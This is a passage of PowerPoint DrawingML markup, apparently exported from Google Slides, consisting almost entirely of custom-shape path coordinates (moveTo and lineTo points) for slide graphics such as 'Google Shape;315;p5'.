                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="708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5" name="Google Shape;315;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6114500" y="2324225"/>
              <a:ext cx="158675" cy="329225"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="6347" h="13169" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="588" y="330"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="808" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="440"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="550"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="1944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="1724"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1432" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="1467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1322" y="1467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1285" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1285" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1322" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="955" y="1724"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="845" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="735" y="1027"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="697"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="330"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3706" y="2825"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3926" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5467" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="3888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4660" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3046" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3046" y="3888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4073" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4183" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="3888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="2825"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1285" y="5686"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1725" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2129" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1322" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="515" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="515" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="5686"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2239" y="6676"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3009" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2239" y="6676"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1065" y="6566"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1872" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="7226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1542" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="955" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="6566"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3082" y="9721"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3009" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="9721"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1138" y="9758"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1358" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1542" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1542" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1542" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1542" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1542" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1652" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2129" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2239" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2569" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2569" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2936" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="12178"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2129" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1652" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1432" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1322" y="12068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="9758"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="625" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="478" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331" y="330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="735" y="2274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1175" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1322" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1652" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="515" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="625" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="625" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1175" y="12765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1322" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2129" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2569" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="12875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="12765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="9647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3743" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="5612"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4660" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="3888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="4035"/>
